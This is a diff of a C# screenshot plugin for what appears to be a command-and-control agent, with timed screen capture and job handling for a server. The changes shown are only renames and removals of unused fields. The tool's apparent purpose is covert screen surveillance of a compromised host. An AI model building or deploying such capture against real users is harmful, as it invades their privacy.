@@ -1,7 +1,6 @@
 ﻿using System.Drawing;
 using System.Runtime.InteropServices;
 using System.IO.Compression;
-using System.IO;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
@@ -9,23 +8,17 @@ using Agent.Utilities;
 
 //Nuget - System.drawing.common 
 //Only works on windows
-namespace screenshot
+namespace Agent
 {
-    public class Screenshot : IPlugin
+    public class Plugin : IPlugin
     {
         public string Name => "screenshot";
-        public IAgentConfig config { get; set; }
-        public IMessageManager messageManager { get; set; }
-        public ILogger logger { get; set; }
-        public ITokenManager tokenManager { get; set; }
+        private IMessageManager messageManager { get; set; }
         private System.Timers.Timer screenshotTimer;
 
-        public Screenshot(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
         {
             this.messageManager = messageManager;
-            this.config = config;
-            this.logger = logger;
-            this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
         {
@@ -132,9 +125,9 @@ namespace screenshot
         }
     }
 
-    class ScreenCapture
+    internal class ScreenCapture
     {
-        public static List<Bitmap> Capture()
+        internal static List<Bitmap> Capture()
         {
             var bitmaps = new List<Bitmap>();
             foreach (var screen in GetScreens())
